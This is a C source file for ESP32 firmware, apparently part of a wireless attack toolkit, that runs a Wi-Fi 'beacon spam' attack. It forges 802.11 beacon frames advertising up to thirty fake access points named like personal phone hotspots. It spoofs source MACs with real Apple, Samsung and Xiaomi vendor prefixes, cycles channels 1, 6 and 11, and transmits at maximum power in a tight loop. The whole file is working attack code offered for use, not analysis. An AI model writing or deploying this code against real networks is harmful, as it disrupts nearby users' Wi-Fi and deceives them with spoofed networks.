/*
 * beacon_spam.c
 *
 *  Created on: 11 nov. 2024
 *      Author: nicotina
 */

#include <stdint.h>
#include <string.h>
#include "esp_random.h"
#include "esp_wifi.h"
#include "freertos/task.h"
#include "nvs_flash.h"

#define BEACON_INTERVAL_MS 5
#define MAX_SSIDS 30
#define SSID_LEN 32

char beacon_ssids[SSID_LEN * MAX_SSIDS] = { 0 };

const uint8_t channels[] = {1,6,11};
uint8_t chidx = 0;
const char *TAG = "attack:beacon_spam:";


uint8_t wifi_channel = 1;

const char* nombres[20] = {
    "Juan",
    "Maria",
    "Jose",
    "Ana",
    "Luis",
    "Carmen",
    "Pedro",
    "Laura",
    "Jorge",
    "Marta",
    "Carlos",
    "Lucia",
    "Antonio",
    "Sofia",
    "Miguel",
    "Elena",
    "Francisco",
    "Isabel",
    "Manuel",
    "Paula"
};


const char* apellidos[20] = {
    "Garcia",
    "Martinez",
    "Rodriguez",
    "Lopez",
    "Hernandez",
    "Gonzalez",
    "Perez",
    "Sanchez",
    "Ramirez",
    "Torres",
    "Flores",
    "Rivera",
    "Gomez",
    "Diaz",
    "Cruz",
    "Morales",
    "Ortiz",
    "Vargas",
    "Ramos",
    "Castillo"
};

const char* celulares[20] = {
    "iPhone 13",
    "iPhone 12",
    "Galaxy S21",
    "Galaxy S20",
    "Pixel 6",
    "Pixel 5",
    "Redmi Note 10",
    "Redmi Note 9",
    "OnePlus 9",
    "OnePlus 8",
    "Huawei P40",
    "Mate 40",
    "Moto G Power",
    "Moto G Stylus",
    "Nokia G50",
    "Xperia 1 III",
    "Oppo Find X3",
    "Realme 8",
    "ROG Phone 5",
    "LG V60"
};


// Beacon packet modificado con parámetros optimizados para móviles
uint8_t beaconPacket[109] = {
    /*  0 - 3  */ 0x80, 0x00, 0x00, 0x00,             // Type/Subtype: managment beacon frame
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: broadcast
    /* 10 - 15 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source
    /* 16 - 21 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source
    
    // Fixed parameters
    /* 22 - 23 */ 0x00, 0x00,                         // Fragment & sequence number
    /* 24 - 31 */ 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, // Timestamp
    /* 32 - 33 */ 0x32, 0x00,                         // Beacon Interval: 50ms
    /* 34 - 35 */ 0x01, 0x00,                         // Capabilities Info: ESS

    // Tagged parameters
    
    // SSID parameters
    /* 36 - 37 */ 0x00, 0x20,                         // SSID parameter set, length 32
    /* 38 - 69 */ 0x20, 0x20, 0x20, 0x20,
                  0x20, 0x20, 0x20, 0x20,
                  0x20, 0x20, 0x20, 0x20,
                  0x20, 0x20, 0x20, 0x20,
                  0x20, 0x20, 0x20, 0x20,
                  0x20, 0x20, 0x20, 0x20,
                  0x20, 0x20, 0x20, 0x20,
                  0x20, 0x20, 0x20, 0x20,

    // Supported Rates
    /* 70 - 71 */ 0x01, 0x08,                         // Tag: Supported Rates, length
    /* 72 */ 0x82,                                    // 1(B)
    /* 73 */ 0x84,                                    // 2(B)
    /* 74 */ 0x8b,                                    // 5.5(B)
    /* 75 */ 0x96,                                    // 11(B)
    /* 76 */ 0x24,                                    // 18
    /* 77 */ 0x30,                                    // 24
    /* 78 */ 0x48,                                    // 36
    /* 79 */ 0x6c,                                    // 54

    // Channel
    /* 80 - 81 */ 0x03, 0x01,                         // Channel set, length
    /* 82 */      0x01                                // Current Channel
};

void generar_ssid(char *out) {
    uint32_t random = esp_random();
    uint8_t nombreidx = (random)    % 20;
    uint8_t apeidx    = (random>>8) % 20;
    uint8_t celuidx   = (random>>16)% 20;
    
    memset(out, 0, SSID_LEN);
    snprintf(out, SSID_LEN, "%s de %s %s", 
             celulares[celuidx], 
             nombres[nombreidx], 
             apellidos[apeidx]);
    
    size_t len = strlen(out);
    if (len >= SSID_LEN) len = SSID_LEN - 1;
    out[len] = '\0';  // Aseguramos null-termination
}

void generar_mac(uint8_t *out) {
    static const uint8_t ouis[][3] = {
        {0x00, 0x0C, 0xE7},  // MediaTek
        {0x00, 0x23, 0xA7},  // Samsung
        {0x00, 0x23, 0x76},  // HTC
        {0x00, 0x26, 0x08},  // Apple
        {0x48, 0x74, 0x6E},  // Apple
        {0xB8, 0x53, 0xAC},  // Apple
        {0x5C, 0x51, 0x88},  // Xiaomi
        {0x8C, 0xBE, 0xBE},  // Xiaomi
    };
    
    // Usar OUIs reales para el inicio de la MAC
    int oui_idx = esp_random() % (sizeof(ouis)/sizeof(ouis[0]));
    memcpy(out, ouis[oui_idx], 3);
    
    // Generar últimos 3 bytes aleatorios
    esp_fill_random(out + 3, 3);
}

void siguiente_canal() {
    wifi_channel = channels[chidx];
    chidx = (chidx + 1) % sizeof(channels);
    esp_wifi_set_channel(wifi_channel, WIFI_SECOND_CHAN_NONE);
}

void iniciar_wifi_raw() {
    // Inicializar el NVS primero
    ESP_ERROR_CHECK(nvs_flash_init());
    
    // Configurar WiFi con parámetros optimizados
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    ESP_ERROR_CHECK(esp_wifi_start());
    
    // Configuraciones adicionales
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));
    ESP_ERROR_CHECK(esp_wifi_set_max_tx_power(84));
    
    // Deshabilitar el power save
    esp_wifi_set_ps(WIFI_PS_NONE);
}

void attack_beacon_spam_task(void *pvParameters) {
    uint8_t mac[6];
    uint32_t sequence = 0;
    
    while (true) {
        siguiente_canal();
        
        for (int i = 0; i < MAX_SSIDS; ++i) {
            generar_mac(mac);
            
            memcpy(beaconPacket + 10, mac, 6);
            memcpy(beaconPacket + 16, mac, 6);
            memcpy(beaconPacket + 38, beacon_ssids + SSID_LEN*i, SSID_LEN);
            beaconPacket[82] = wifi_channel;
            
            beaconPacket[22] = sequence & 0xFF;
            beaconPacket[23] = (sequence >> 8) & 0xFF;
            sequence++;
            
            for (int j = 0; j < 3; j++) {
                esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, sizeof(beaconPacket), false);
                vTaskDelay(pdMS_TO_TICKS(5));  // 5ms entre envíos
            }
            
            // Pequeño delay entre SSIDs
            vTaskDelay(pdMS_TO_TICKS(2));
        }
        
        // Regenerar un SSID aleatorio cada ciclo
        int idx = esp_random() % MAX_SSIDS;
        generar_ssid(beacon_ssids + SSID_LEN*idx);
        
        vTaskDelay(pdMS_TO_TICKS(BEACON_INTERVAL_MS));
    }
}

void attack_beacon_spam() {
    iniciar_wifi_raw();
    
    // Generar SSIDs iniciales
    for (int i = 0; i < MAX_SSIDS; ++i) {
        generar_ssid(beacon_ssids + SSID_LEN*i);
    }
    
    xTaskCreatePinnedToCore(
        attack_beacon_spam_task,
        "beacon_spam",
        4096,
        NULL,
        5,
        NULL,
        0
    );
}